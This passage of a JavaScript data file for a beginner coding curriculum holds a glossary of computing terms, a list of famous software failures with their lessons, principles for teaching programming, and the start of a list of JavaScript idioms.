      bootcamp: 'Apprenticeship (rare but growing)',
      url: 'Various employers',
      cost: 'PAID by company (rare gem)',
      duration: '6 months to 2 years',
      whatYouLearn: 'On-the-job + structured learning',
      whoItsFor: 'Career changers, untraditional backgrounds',
      reputation: 'Excellent when available',
      outcomes: 'Strong — directly leads to job',
      considerations: 'Rare. Competitive. Look for "developer apprenticeship" + specific companies (Microsoft, IBM, Pivotal had programs).',
    },
  ];

  // ─── Glossary of computing terms (verbose) ───────────────────────
  var COMPUTING_GLOSSARY = [
    {
      term: 'Algorithm',
      definition: 'A step-by-step procedure for solving a problem or accomplishing a task.',
      example: 'A recipe is an algorithm: gather ingredients → mix → bake. Software algorithms work the same way.',
      whyMatters: 'All software is built from algorithms. Better algorithms = faster, more efficient programs.',
      relatedTerms: ['Big-O', 'Pseudocode', 'Complexity', 'Data structure'],
      learnMore: 'CS textbook on algorithms.',
    },
    {
      term: 'API (Application Programming Interface)',
      definition: 'A set of rules + protocols that allows different software programs to talk to each other.',
      example: 'When your weather app gets weather data, it uses an API to ask a weather service for data.',
      whyMatters: 'APIs are how modern apps integrate with services. They\'re the connectors of the software world.',
      relatedTerms: ['REST', 'GraphQL', 'Endpoint', 'Request', 'Response'],
      learnMore: 'Practice with public APIs (PokéAPI, NASA, etc.).',
    },
    {
      term: 'Asynchronous (Async)',
      definition: 'Code that doesn\'t block while waiting. Allows other code to run in the meantime.',
      example: 'When you click "submit," the app sends data to a server. While waiting, the app can still respond to other clicks.',
      whyMatters: 'Most modern apps are async — fetching data, processing files, etc.',
      relatedTerms: ['Promise', 'Callback', 'await', 'async function', 'Event loop'],
      learnMore: 'JavaScript async/await tutorials.',
    },
    {
      term: 'Bug',
      definition: 'An error or unintended behavior in a program.',
      example: 'A calculator app shows "1 + 1 = 11" instead of "1 + 1 = 2."',
      whyMatters: 'All software has bugs. Finding + fixing them is most of programming work.',
      relatedTerms: ['Debugging', 'Testing', 'Error handling', 'Crash'],
      learnMore: 'Practice debugging with intentional bugs.',
    },
    {
      term: 'Callback',
      definition: 'A function passed to another function, to be called later.',
      example: 'When you click a button, your "click handler" function is the callback that runs.',
      whyMatters: 'Foundation of event-driven + async programming in JavaScript.',
      relatedTerms: ['Event handler', 'Higher-order function', 'Promise', 'async/await'],
      learnMore: 'JavaScript event-handling tutorials.',
    },
    {
      term: 'CDN (Content Delivery Network)',
      definition: 'Servers around the world that cache content close to users for fast delivery.',
      example: 'When you load a YouTube video, you get it from a server near you (not all the way from California).',
      whyMatters: 'Makes the web fast worldwide.',
      relatedTerms: ['Cache', 'Edge', 'Latency'],
      learnMore: 'Cloudflare\'s explanation of CDNs.',
    },
    {
      term: 'Client-server',
      definition: 'A model where one program (client) requests services from another (server).',
      example: 'Your browser (client) requests a web page from a server. The server responds.',
      whyMatters: 'Fundamental model of the web + internet.',
      relatedTerms: ['HTTP', 'Request', 'Response', 'Backend', 'Frontend'],
      learnMore: 'Web fundamentals tutorials.',
    },
    {
      term: 'Cloud',
      definition: 'Computing services delivered over the internet (storage, compute, data).',
      example: 'Google Drive, Dropbox, AWS, Azure. Files + computing happen on company servers.',
      whyMatters: 'Modern apps rely heavily on cloud services.',
      relatedTerms: ['AWS', 'Azure', 'GCP', 'SaaS', 'PaaS', 'IaaS'],
      learnMore: 'AWS free tier exploration.',
    },
    {
      term: 'Compile',
      definition: 'Convert source code from one language to another (usually high-level → machine code or another high-level).',
      example: 'TypeScript compiles to JavaScript. C++ compiles to machine code.',
      whyMatters: 'Allows writing in higher-level languages while running on real hardware.',
      relatedTerms: ['Transpile', 'Interpreter', 'Linker', 'Bytecode'],
      learnMore: 'Compilers textbook (Dragon Book).',
    },
    {
      term: 'Component',
      definition: 'A reusable, self-contained piece of code or UI.',
      example: 'In React, <Button /> is a component. Reusable across the app.',
      whyMatters: 'Components make complex apps manageable.',
      relatedTerms: ['React', 'Vue', 'Module', 'Encapsulation'],
      learnMore: 'React component documentation.',
    },
    {
      term: 'CSS (Cascading Style Sheets)',
      definition: 'A language for styling HTML — colors, layouts, fonts, animations.',
      example: 'CSS makes a web page look beautiful instead of being just black text on white background.',
      whyMatters: 'CSS is what makes the web visual.',
      relatedTerms: ['HTML', 'JavaScript', 'Selector', 'Cascade'],
      learnMore: 'MDN CSS docs.',
    },
    {
      term: 'Database',
      definition: 'Structured storage for data, designed for efficient retrieval.',
      example: 'When Facebook stores your friends list, it uses a database. Designed to handle billions of users.',
      whyMatters: 'Most apps need to store data persistently.',
      relatedTerms: ['SQL', 'NoSQL', 'Table', 'Schema', 'Query'],
      learnMore: 'Postgres or MongoDB tutorials.',
    },
    {
      term: 'Debug',
      definition: 'Process of finding + fixing bugs in code.',
      example: 'Setting breakpoints, console.log statements, step-through execution.',
      whyMatters: 'Most programming time is spent debugging.',
      relatedTerms: ['Breakpoint', 'Stack trace', 'Console', 'IDE'],
      learnMore: 'Chrome DevTools debugging tutorial.',
    },
    {
      term: 'DOM (Document Object Model)',
      definition: 'A tree-like representation of an HTML document that can be manipulated with JavaScript.',
      example: 'JavaScript can change text, hide elements, add new content — all by modifying the DOM.',
      whyMatters: 'Foundation of all interactive web pages.',
      relatedTerms: ['HTML', 'JavaScript', 'Element', 'Tree'],
      learnMore: 'MDN DOM docs.',
    },
    {
      term: 'Encryption',
      definition: 'Scrambling data so only authorized parties can read it.',
      example: 'HTTPS uses encryption to protect your password when you log in.',
      whyMatters: 'Critical for security + privacy.',
      relatedTerms: ['HTTPS', 'TLS', 'SSL', 'Key', 'Certificate'],
      learnMore: 'Cryptography basics.',
    },
    {
      term: 'Event',
      definition: 'Something that happens in a program that code can respond to.',
      example: 'Mouse click, keyboard press, page load, network response — all events.',
      whyMatters: 'Foundation of interactive UIs.',
      relatedTerms: ['Event listener', 'Event handler', 'Event bubble', 'Event loop'],
      learnMore: 'JavaScript event tutorials.',
    },
    {
      term: 'Framework',
      definition: 'A collection of code that provides structure + tools for building applications.',
      example: 'React, Vue, Angular for front-end. Django, Rails for back-end.',
      whyMatters: 'Frameworks speed up development + enforce best practices.',
      relatedTerms: ['Library', 'Boilerplate', 'Convention'],
      learnMore: 'Try a beginner framework tutorial.',
    },
    {
      term: 'Frontend / Backend',
      definition: 'Frontend: user interface (what you see). Backend: server-side logic + data.',
      example: 'Frontend: HTML, CSS, JavaScript. Backend: Node.js, Python, databases.',
      whyMatters: 'Different skill sets + roles in modern web dev.',
      relatedTerms: ['Full-stack', 'Client', 'Server'],
      learnMore: 'Both frontend + backend tutorials.',
    },
    {
      term: 'Function',
      definition: 'A reusable block of code that does a specific thing.',
      example: 'function greet(name) { return "Hello, " + name + "!"; }',
      whyMatters: 'Functions organize code into reusable pieces.',
      relatedTerms: ['Method', 'Procedure', 'Argument', 'Parameter', 'Return value'],
      learnMore: 'JavaScript function tutorials.',
    },
    {
      term: 'Git',
      definition: 'A version control system. Tracks changes to code over time.',
      example: 'Each "commit" is a snapshot of your code. Can go back to any commit.',
      whyMatters: 'Foundation of modern code collaboration.',
      relatedTerms: ['GitHub', 'Branch', 'Commit', 'Pull request', 'Merge'],
      learnMore: 'git-scm.com book (free).',
    },
    {
      term: 'GitHub',
      definition: 'A platform for hosting Git repositories + collaborating on code.',
      example: 'Where most open-source code lives. Where developers showcase work.',
      whyMatters: 'Industry standard for collaborative coding.',
      relatedTerms: ['Git', 'Pull request', 'Issues', 'Open source'],
      learnMore: 'GitHub Skills (interactive courses).',
    },
    {
      term: 'HTML (HyperText Markup Language)',
      definition: 'The standard markup language for documents on the web. Describes structure of web pages.',
      example: '<h1>Welcome</h1> creates a heading.',
      whyMatters: 'Every web page is HTML. Foundation of the web.',
      relatedTerms: ['CSS', 'JavaScript', 'Element', 'Tag'],
      learnMore: 'MDN HTML docs.',
    },
    {
      term: 'HTTP / HTTPS',
      definition: 'Protocol for transferring data between client + server. HTTPS is the secure (encrypted) version.',
      example: 'When you load a website, your browser uses HTTP/S to request the page.',
      whyMatters: 'Foundation of the web.',
      relatedTerms: ['REST', 'Request', 'Response', 'TLS', 'Status code'],
      learnMore: 'MDN HTTP docs.',
    },
    {
      term: 'IDE (Integrated Development Environment)',
      definition: 'Software with tools for writing, testing, debugging code in one place.',
      example: 'VS Code, IntelliJ, Visual Studio. Has code editor, debugger, terminal, etc.',
      whyMatters: 'Makes coding more productive.',
      relatedTerms: ['Editor', 'Debugger', 'Plugin', 'Extension'],
      learnMore: 'Try VS Code (free).',
    },
    {
      term: 'JSON (JavaScript Object Notation)',
      definition: 'A lightweight data format. Used by most APIs.',
      example: '{"name": "Alice", "age": 30}',
      whyMatters: 'Standard for data interchange between programs.',
      relatedTerms: ['XML', 'Object', 'API', 'Parse', 'Stringify'],
      learnMore: 'JSON.org reference.',
    },
    {
      term: 'JavaScript',
      definition: 'A programming language used primarily for web development.',
      example: 'Adds interactivity to web pages. Runs in browser + on servers (Node.js).',
      whyMatters: 'Most-used programming language in the world.',
      relatedTerms: ['Node.js', 'TypeScript', 'V8', 'ECMAScript'],
      learnMore: 'MDN JavaScript docs.',
    },
    {
      term: 'Library',
      definition: 'A collection of pre-written code that solves common problems.',
      example: 'jQuery, Lodash, Moment. You call library functions; library handles details.',
      whyMatters: 'Don\'t reinvent the wheel.',
      relatedTerms: ['Framework', 'Package', 'Module', 'Dependency'],
      learnMore: 'npm.org to find libraries.',
    },
    {
      term: 'Loop',
      definition: 'Code that runs repeatedly until a condition is met.',
      example: 'for (let i = 0; i < 10; i++) { /* runs 10 times */ }',
      whyMatters: 'Fundamental for processing collections of data.',
      relatedTerms: ['for', 'while', 'forEach', 'iteration'],
      learnMore: 'JavaScript loop tutorials.',
    },
    {
      term: 'Method',
      definition: 'A function attached to an object.',
      example: 'arr.push(x) is calling the push method on the array.',
      whyMatters: 'Object-oriented programming foundation.',
      relatedTerms: ['Function', 'Object', 'Property', 'Class'],
      learnMore: 'MDN methods docs.',
    },
    {
      term: 'Module',
      definition: 'A self-contained piece of code with its own scope, importable into others.',
      example: 'Each JavaScript file is a module. import + export move code between them.',
      whyMatters: 'Organize code into manageable pieces.',
      relatedTerms: ['Import', 'Export', 'Library', 'Package'],
      learnMore: 'JavaScript module tutorials.',
    },
    {
      term: 'Node.js',
      definition: 'A JavaScript runtime. Lets you run JavaScript outside a browser (on a server, CLI tool, etc.).',
      example: 'Most modern backend code in JavaScript runs on Node.js.',
      whyMatters: 'Enables full-stack JavaScript development.',
      relatedTerms: ['npm', 'V8', 'Express', 'Backend'],
      learnMore: 'nodejs.org tutorials.',
    },
    {
      term: 'NPM (Node Package Manager)',
      definition: 'A package manager for Node.js. Manages dependencies.',
      example: 'npm install react adds React to your project.',
      whyMatters: 'Standard way to use libraries.',
      relatedTerms: ['Node.js', 'Package', 'package.json', 'Dependency'],
      learnMore: 'npmjs.com docs.',
    },
    {
      term: 'Object',
      definition: 'A data structure that groups related properties + methods.',
      example: 'const user = {name: "Alice", age: 30, greet() {/*...*/}};',
      whyMatters: 'Foundation of object-oriented programming.',
      relatedTerms: ['Class', 'Property', 'Method', 'Instance'],
      learnMore: 'JavaScript object tutorials.',
    },
    {
      term: 'OOP (Object-Oriented Programming)',
      definition: 'Programming paradigm based on objects + classes. Organizes code around data + behavior.',
      example: 'Class definitions + inheritance + encapsulation. Java + C++ are heavily OOP.',
      whyMatters: 'Common style in enterprise + many languages.',
      relatedTerms: ['Class', 'Object', 'Inheritance', 'Encapsulation', 'Polymorphism'],
      learnMore: 'OOP concepts books.',
    },
    {
      term: 'Open source',
      definition: 'Software whose source code is freely available + can be modified + redistributed.',
      example: 'Linux, Python, React. Most software you use depends on open source.',
      whyMatters: 'Foundation of modern software ecosystem.',
      relatedTerms: ['License', 'GitHub', 'GPL', 'MIT'],
      learnMore: 'opensource.org.',
    },
    {
      term: 'Package',
      definition: 'A bundle of code + metadata that can be installed + used in projects.',
      example: 'React is a package. You "npm install react" to use it.',
      whyMatters: 'Packages are how you reuse code.',
      relatedTerms: ['npm', 'Dependency', 'Module', 'Library'],
      learnMore: 'npmjs.com.',
    },
    {
      term: 'Pixel',
      definition: 'The smallest unit of a digital display. A picture element.',
      example: 'A 1920x1080 screen has 2,073,600 pixels.',
      whyMatters: 'Pixels are the units of digital images + UI.',
      relatedTerms: ['Resolution', 'PPI', 'Color', 'RGB'],
      learnMore: 'Computer graphics textbooks.',
    },
    {
      term: 'Polymorphism',
      definition: 'The ability for different objects to respond to the same message in different ways.',
      example: 'Animal.makeSound() — Dog barks, Cat meows. Same method, different behavior.',
      whyMatters: 'Key OOP concept. Enables flexibility.',
      relatedTerms: ['OOP', 'Inheritance', 'Method', 'Class'],
      learnMore: 'OOP textbooks.',
    },
    {
      term: 'Promise',
      definition: 'An object representing the eventual completion or failure of an asynchronous operation.',
      example: 'fetch("/api") returns a Promise that resolves with the response.',
      whyMatters: 'Modern JavaScript async handling.',
      relatedTerms: ['Async', 'Await', 'Then', 'Catch'],
      learnMore: 'MDN Promise docs.',
    },
    {
      term: 'Pseudocode',
      definition: 'Informal description of an algorithm using language-like syntax.',
      example: 'FUNCTION sort(list): COMPARE each pair, SWAP if out of order, REPEAT.',
      whyMatters: 'Plan before coding. Communicate algorithms.',
      relatedTerms: ['Algorithm', 'Design', 'Flowchart'],
      learnMore: 'Try writing pseudocode for any algorithm.',
    },
    {
      term: 'REST (Representational State Transfer)',
      definition: 'An architectural style for APIs. Uses HTTP verbs (GET, POST, PUT, DELETE) on resources.',
      example: 'GET /users/123 retrieves user 123. POST /users creates a new user.',
      whyMatters: 'Standard way most APIs work.',
      relatedTerms: ['API', 'HTTP', 'Endpoint', 'Resource', 'GraphQL'],
      learnMore: 'restfulapi.net.',
    },
    {
      term: 'Recursion',
      definition: 'A function that calls itself.',
      example: 'function factorial(n) { return n <= 1 ? 1 : n * factorial(n - 1); }',
      whyMatters: 'Useful for tree-like structures + divide-and-conquer.',
      relatedTerms: ['Base case', 'Stack overflow', 'Iteration'],
      learnMore: 'Recursion tutorials.',
    },
    {
      term: 'Refactor',
      definition: 'Restructure existing code without changing its behavior.',
      example: 'Renaming variables for clarity. Extracting repeated code into a function.',
      whyMatters: 'Maintains code quality over time.',
      relatedTerms: ['Code smell', 'Technical debt', 'Test'],
      learnMore: 'Refactoring book by Martin Fowler.',
    },
    {
      term: 'Repository (Repo)',
      definition: 'A Git project. Contains all files + commit history.',
      example: 'A GitHub repo is a project hosted on GitHub.',
      whyMatters: 'Where your code lives.',
      relatedTerms: ['Git', 'GitHub', 'Branch', 'Clone'],
      learnMore: 'Create your first repo.',
    },
    {
      term: 'Schema',
      definition: 'The structure of a database — tables, columns, types, relationships.',
      example: 'Users table has columns: id (int), name (string), email (string).',
      whyMatters: 'Schema design affects performance + maintainability.',
      relatedTerms: ['Database', 'Table', 'Column', 'Normalization'],
      learnMore: 'Database design books.',
    },
    {
      term: 'SDK (Software Development Kit)',
      definition: 'A set of tools + documentation for building software for a specific platform or service.',
      example: 'Stripe SDK for accepting payments. Mapbox SDK for maps.',
      whyMatters: 'Speeds up building integrations.',
      relatedTerms: ['API', 'Library', 'Framework'],
      learnMore: 'SDK documentation per service.',
    },
    {
      term: 'Server',
      definition: 'A computer that provides services or data to other computers (clients) over a network.',
      example: 'When you load Twitter, you\'re reading from Twitter\'s servers.',
      whyMatters: 'Foundation of the internet.',
      relatedTerms: ['Client-server', 'Cloud', 'Hosting'],
      learnMore: 'How the web works.',
    },
    {
      term: 'String',
      definition: 'A sequence of characters. Text data.',
      example: '"Hello, World!" is a string.',
      whyMatters: 'Most data is text.',
      relatedTerms: ['Character', 'Unicode', 'Concatenation'],
      learnMore: 'MDN string docs.',
    },
    {
      term: 'Stack',
      definition: 'Data structure with last-in-first-out behavior. Or: the layers of tech in a project.',
      example: 'Function calls form a "call stack" — last called is last to return. Tech stack = HTML+CSS+JS+React+Node+MongoDB.',
      whyMatters: 'Stacks appear constantly in programming.',
      relatedTerms: ['Queue', 'Heap', 'Memory', 'Call stack'],
      learnMore: 'Data structures textbook.',
    },
    {
      term: 'TypeScript',
      definition: 'A typed superset of JavaScript. Adds static type checking.',
      example: 'function add(a: number, b: number): number { return a + b; }',
      whyMatters: 'Catches type errors at compile time.',
      relatedTerms: ['JavaScript', 'Type', 'Static typing'],
      learnMore: 'typescriptlang.org tutorial.',
    },
    {
      term: 'URL (Uniform Resource Locator)',
      definition: 'An address pointing to a resource on the internet.',
      example: 'https://example.com/about',
      whyMatters: 'How we navigate the web.',
      relatedTerms: ['HTTP', 'Domain', 'URI', 'Endpoint'],
      learnMore: 'MDN URL docs.',
    },
    {
      term: 'Variable',
      definition: 'A named storage for a value.',
      example: 'let age = 25; // "age" is the variable, 25 is the value.',
      whyMatters: 'Foundation of programming.',
      relatedTerms: ['Constant', 'Type', 'Scope', 'Reference'],
      learnMore: 'Variables tutorial in any language.',
    },
  ];

  // ─── Famous bugs + their lessons ─────────────────────────────────
  var FAMOUS_BUGS = [
    {
      name: 'The Y2K Bug',
      year: 1999,
      whatHappened: 'Many programs stored years as 2 digits (e.g., "99" for 1999). When year became 2000, "00" could mean 1900 or 2000. Critical systems worldwide were at risk.',
      cost: '~$300-600 billion globally for remediation',
      lesson: 'Always think about edge cases (year boundaries, leap years, etc). Future-proof your data formats.',
      modernEquivalent: 'Y2038 (Unix timestamps overflow on 2038-01-19). Already being addressed.',
      teachingValue: 'Shows the importance of forward-thinking design + planning for the future.',
    },
    {
      name: 'Therac-25 Radiation Therapy Disaster',
      year: '1985-1987',
      whatHappened: 'A medical radiation therapy machine\'s software had a race condition. Patients received massive radiation overdoses. 3-6 patient deaths.',
      cost: 'Loss of life. Major medical malpractice suits.',
      lesson: 'Software has real-world consequences. Race conditions are insidious. Testing matters.',
      modernEquivalent: 'Self-driving car crashes. Trading system errors.',
      teachingValue: 'Engineering ethics. The responsibility of software developers.',
    },
    {
      name: 'Knight Capital 45-Minute Trading Loss',
      year: 2012,
      whatHappened: 'A deploy left some old code running. In 45 minutes, the company lost $440 million in bad trades + went bankrupt.',
      cost: '$440 million + the company itself',
      lesson: 'Deployment processes matter. Test in production-like environments. Have rollback plans.',
      modernEquivalent: 'Continuous deployment failures. Service outages.',
      teachingValue: 'DevOps + reliability engineering.',
    },
    {
      name: 'NASA Mars Climate Orbiter (1999)',
      year: 1999,
      whatHappened: 'Two teams. One used metric units, other used English. The probe crashed into Mars instead of orbiting it.',
      cost: '$125 million spacecraft destroyed',
      lesson: 'Interface specifications matter. Communicate units explicitly.',
      modernEquivalent: 'API integration issues. Mismatched data formats.',
      teachingValue: 'Communication. Units. Interface contracts.',
    },
    {
      name: 'Ariane 5 Explosion (1996)',
      year: 1996,
      whatHappened: 'Ariane 5 rocket exploded 40 seconds after launch. Cause: integer overflow when 64-bit float was converted to 16-bit integer. Hardware came from Ariane 4 + had different physics.',
      cost: '$370 million rocket + payload',
      lesson: 'Reusing code from one context to another can fail catastrophically.',
      modernEquivalent: 'Cross-platform compatibility issues. Migration failures.',
      teachingValue: 'Why testing matters. Why unit + integration testing matters.',
    },
    {
      name: 'GitHub October 2018 24-hour Outage',
      year: 2018,
      whatHappened: 'A 43-second network partition between data centers cascaded into a 24-hour outage. GitHub couldn\'t serve normal traffic for many hours.',
      cost: 'Lost productivity for millions of developers',
      lesson: 'Complex systems have hidden failure modes. Even small triggers can cascade.',
      modernEquivalent: 'Every major service has stories like this (S3 2017, Azure outages, etc).',
      teachingValue: 'Distributed systems are hard. Failure modes are unintuitive.',
    },
    {
      name: 'Heartbleed (OpenSSL bug)',
      year: 2014,
      whatHappened: 'A bug in OpenSSL\'s implementation of TLS allowed remote attackers to read memory from any server using OpenSSL. Affected most of the internet.',
      cost: 'Billions in remediation. Unknown amount of data leaked.',
      lesson: 'Memory safety is critical. Open-source needs better funding.',
      modernEquivalent: 'log4j 2021. Various OpenSSL bugs since.',
      teachingValue: 'Security. Memory safety. Open-source funding ethics.',
    },
    {
      name: 'Log4Shell (Log4j vulnerability)',
      year: 2021,
      whatHappened: 'A widely-used Java logging library had a critical vulnerability allowing remote code execution. Estimated to affect millions of applications worldwide.',
      cost: 'Hundreds of millions in remediation. Some breaches.',
      lesson: 'Transitive dependencies are a major attack surface. Open-source maintainers are often unpaid + overworked.',
      modernEquivalent: 'Most recent: Various other npm + Maven dependencies.',
      teachingValue: 'Supply chain security. Dependency management.',
    },
    {
      name: 'PayPal $92 Quadrillion Account Balance (2013)',
      year: 2013,
      whatHappened: 'A bug briefly displayed a PayPal user\'s balance as $92,233,720,368,547,800 — about 1000x more than the global economy. Just a display bug.',
      cost: 'None, but funny',
      lesson: 'Display bugs aren\'t always trivial. Validate calculations. Handle overflow.',
      modernEquivalent: 'Various billing display errors over the years.',
      teachingValue: 'Numeric overflow + validation matter.',
    },
    {
      name: 'GitHub\'s "master" → "main" Rename (2020)',
      year: 2020,
      whatHappened: 'GitHub renamed the default branch from "master" to "main" responding to advocacy. A small technical change with cultural significance.',
      cost: 'Migration work for many teams',
      lesson: 'Words matter. Defaults shape culture. Inclusive language affects who feels welcome.',
      modernEquivalent: 'Many open-source projects renamed similar things (blacklist → blocklist, etc).',
      teachingValue: 'Inclusive design. Language matters. Sometimes small changes have big impact.',
    },
    {
      name: 'iPhone Calculator AC Bug',
      year: 'Various',
      whatHappened: 'Various iPhone calculator behaviors over the years (e.g., 1 + 2 × 3 = 9 instead of 7). Comes from different design philosophies (calculator-style vs math-style).',
      cost: 'Confused users',
      lesson: 'Real-world design choices have tradeoffs. Document expected behavior.',
      modernEquivalent: 'Order of operations debates in all programming languages.',
      teachingValue: 'Design decisions. User expectations.',
    },
    {
      name: 'Boeing 737 MAX Software (MCAS)',
      year: '2018-2019',
      whatHappened: 'A flight-control software system caused two fatal plane crashes. The system trusted a single sensor + could override pilot inputs.',
      cost: '346 lives lost + $20+ billion in losses + grounding of fleet',
      lesson: 'Safety-critical software needs redundancy. Single points of failure are unacceptable.',
      modernEquivalent: 'Aviation + medical software lessons.',
      teachingValue: 'Engineering ethics. Safety-critical systems. The cost of speed-over-safety.',
    },
    {
      name: 'Tesla Autopilot Misuse Deaths',
      year: 'Various',
      whatHappened: 'Some Tesla drivers misused Autopilot, leading to fatal crashes. Software wasn\'t designed for full autonomy but users treated it that way.',
      cost: 'Lives lost + ongoing investigations',
      lesson: 'Software design must consider misuse. Communicate limitations clearly.',
      modernEquivalent: 'AI tools being misused as "general intelligence" when limited.',
      teachingValue: 'User experience. Communication of limitations. AI safety.',
    },
    {
      name: 'GitHub Codespaces Outage from sslv3 cert (2022)',
      year: 2022,
      whatHappened: 'A certificate change unrelated to Codespaces caused downstream services to fail. Cascading dependency.',
      cost: 'Lost productivity',
      lesson: 'Dependencies cascade. Tests should catch this. Always have rollback.',
      modernEquivalent: 'Cloud service outages.',
      teachingValue: 'Distributed systems complexity.',
    },
    {
      name: 'YouTube\'s Display Counter Overflow',
      year: 2014,
      whatHappened: 'YouTube\'s view counter for "Gangnam Style" overflowed at 2,147,483,647 views (max signed 32-bit integer). They had to switch to 64-bit.',
      cost: 'None — just funny',
      lesson: 'Integer overflow. Plan for scale.',
      modernEquivalent: 'Twitter status ID overflow in 2010.',
      teachingValue: 'Integer limits. Type design.',
    },
  ];

  // ─── Pedagogical principles for teaching coding ──────────────────
  var TEACHING_PRINCIPLES = [
    {
      principle: 'Start with engagement, not theory',
      what: 'Hook students with something interesting before introducing concepts.',
      why: 'Engaged students learn better. Curiosity drives discovery.',
      example: 'Show a working app first. Then teach how to build it. Don\'t start with abstract syntax.',
      antiPattern: 'Spending weeks on syntax before students see what code can do.',
    },
    {
      principle: 'Concrete before abstract',
      what: 'Teach with specific examples first. Generalize later.',
      why: 'Brains learn by pattern-matching from concrete to abstract.',
      example: 'Show 5 specific loops. Then introduce the general "loop" concept.',
      antiPattern: 'Defining "iteration" abstractly before showing any code.',
    },
    {
      principle: 'Errors are learning opportunities',
      what: 'Treat bugs as puzzles, not failures.',
      why: 'Students fear errors. Reframing helps them engage with debugging.',
      example: '"Let\'s see what the error tells us." vs "You did something wrong."',
      antiPattern: 'Pointing out mistakes harshly. Letting frustration take over.',
    },
    {
      principle: 'Show, don\'t just tell',
      what: 'Demonstrate behaviors rather than describe them.',
      why: 'Students remember what they see + do more than what they read.',
      example: 'Live coding. Step-by-step walkthrough. Diagrams.',
      antiPattern: 'Lectures without examples.',
    },
    {
      principle: 'Spaced repetition',
      what: 'Revisit concepts at increasing intervals.',
      why: 'Long-term memory is built through repetition over time.',
      example: 'Variables taught Day 1. Reviewed Day 3, 7, 14.',
      antiPattern: 'Massed practice: 8 hours of variables in one day.',
    },
    {
      principle: 'Active learning > passive learning',
      what: 'Students do, not just watch.',
      why: 'Active engagement creates stronger neural connections.',
      example: 'After explanation, immediately have students apply.',
      antiPattern: 'Long lectures with no practice.',
    },
    {
      principle: 'Pair programming',
      what: 'Two students work on one computer. Driver types; navigator suggests.',
      why: 'Verbalizing reasoning + peer support both improve learning.',
      example: 'Rotate roles every 15 min. Both students learn.',
      antiPattern: 'Forcing pairs of students who don\'t work well together.',
    },
    {
      principle: 'Authentic projects',
      what: 'Have students build something real, not contrived exercises.',
      why: 'Real motivation. Real complexity. Real learning.',
      example: 'Build an app to track YOUR sports stats, not a generic "data app."',
      antiPattern: 'Generic exercises that students don\'t care about.',
    },
    {
      principle: 'Scaffolding',
      what: 'Provide structure that\'s gradually removed as students learn.',
      why: 'Just-too-hard tasks frustrate. Just-too-easy bore. Vygotsky\'s ZPD.',
      example: 'Start with template. Remove parts. Eventually start from blank.',
      antiPattern: 'Throw students into the deep end. Or never let them swim.',
    },
    {
      principle: 'Multiple ways to engage',
      what: 'Provide visual, auditory, kinesthetic options.',
      why: 'Students learn differently. Different modalities reach different students.',
      example: 'Video tutorial + text + hands-on + group discussion. Mix.',
      antiPattern: 'One-size-fits-all approach.',
    },
    {
      principle: 'Real-world relevance',
      what: 'Connect concepts to students\' lives + interests.',
      why: 'Relevance drives motivation. Without it, learning is rote.',
      example: 'Connecting recursion to Russian nesting dolls. Variables to boxes.',
      antiPattern: 'Abstract concepts with no real-world hook.',
    },
    {
      principle: 'Frequent low-stakes assessment',
      what: 'Many small checks rather than few big tests.',
      why: 'Catches misunderstandings early. Reduces test anxiety.',
      example: 'Exit tickets. Quick polls. Pair-share + share-out.',
      antiPattern: 'Only one big midterm + final.',
    },
    {
      principle: 'Errors are normal',
      what: 'Even experts have bugs. Normalize that.',
      why: 'Students think coding should be smooth. They give up when it isn\'t.',
      example: 'Share your own debugging stories. Show real error logs.',
      antiPattern: 'Pretending coding is easy + frictionless.',
    },
    {
      principle: 'Code reading',
      what: 'Have students read code, not just write it.',
      why: 'Pros spend more time reading than writing. Reading code teaches patterns.',
      example: 'Have students read + explain a small piece of well-written code.',
      antiPattern: 'Only ever writing code.',
    },
    {
      principle: 'Reflection',
      what: 'Have students reflect on what they learned + what was hard.',
      why: 'Metacognition (thinking about thinking) deepens learning.',
      example: 'End each session with 3-min reflection: what worked, what didn\'t.',
      antiPattern: 'Rush from one exercise to next.',
    },
    {
      principle: 'Diverse role models',
      what: 'Show that coders are diverse — different genders, races, backgrounds.',
      why: 'Students need to see themselves in tech.',
      example: 'Feature Ada Lovelace, Grace Hopper, Margaret Hamilton, modern diverse engineers.',
      antiPattern: 'Implicit message that "coders look like X."',
    },
    {
      principle: 'Tinker + iterate',
      what: 'Encourage experimentation, not perfectionism.',
      why: 'Coding is iterative. First version is never the last.',
      example: 'Start with messy code that works. Then refactor.',
      antiPattern: 'Demanding perfection on first attempt.',
    },
    {
      principle: 'Collaboration is real',
      what: 'In the real world, coders work in teams. Practice this.',
      why: 'Solo coding can lead to imposter syndrome + bad habits.',
      example: 'Pair programming. Code reviews. Group projects.',
      antiPattern: 'Always solo work.',
    },
    {
      principle: 'Use what works in industry',
      what: 'Teach industry-standard tools, not toy versions.',
      why: 'Transferable skills. Less to relearn.',
      example: 'Use Git from day one. Use real editors (VS Code). Use real testing.',
      antiPattern: 'Toy tools that don\'t exist outside class.',
    },
    {
      principle: 'Address impostor syndrome',
      what: 'Many students feel they don\'t belong in tech. Acknowledge this.',
      why: 'Impostor syndrome causes dropouts.',
      example: 'Share that even senior engineers feel this. Normalize asking questions.',
      antiPattern: 'Pretending "real coders" never struggle.',
    },
  ];

  // ─── Common code patterns + idioms ───────────────────────────────
  var CODE_IDIOMS = [
    {
      idiom: 'Default parameter (with ||)',
      pattern: 'function greet(name) { name = name || "World"; return "Hello, " + name; }',
      modernAlternative: 'function greet(name = "World") { return "Hello, " + name; }',
      explanation: 'Old way used || to default. ES6 has parameter defaults.',
      gotchas: 'Old way: || treats 0, "" as missing. New way: only undefined.',
    },
    {
      idiom: 'Check if variable exists',
      pattern: 'if (typeof myVar !== "undefined") { /* ... */ }',
      modernAlternative: '// If declared, use: if (myVar != null) { ... }\n// typeof is only needed for possibly-undeclared vars',
      explanation: 'typeof never throws (even for undeclared). Other checks may throw.',
      gotchas: 'typeof null is "object" (historical bug).',
    },
    {
      idiom: 'Array copy',
      pattern: 'const copy = arr.slice();',
      modernAlternative: 'const copy = [...arr];\n// Or: const copy = Array.from(arr);',
      explanation: 'Multiple ways. Spread is most idiomatic in modern JS.',
      gotchas: 'All do shallow copy. Nested objects share refs.',
    },
    {
      idiom: 'Object copy',
      pattern: 'const copy = Object.assign({}, obj);',
      modernAlternative: 'const copy = { ...obj };\n// For deep clone: const copy = structuredClone(obj);',
      explanation: 'Spread is preferred. structuredClone for deep clones.',
      gotchas: 'Spread is shallow. structuredClone works with most things but not functions.',
    },
    {
      idiom: 'Object/array length check',
      pattern: 'if (arr.length === 0) { /* empty */ }',
      modernAlternative: 'if (!arr.length) { /* empty */ }\n// Or for clarity, keep === 0',
      explanation: 'Both work. Explicit is sometimes clearer.',
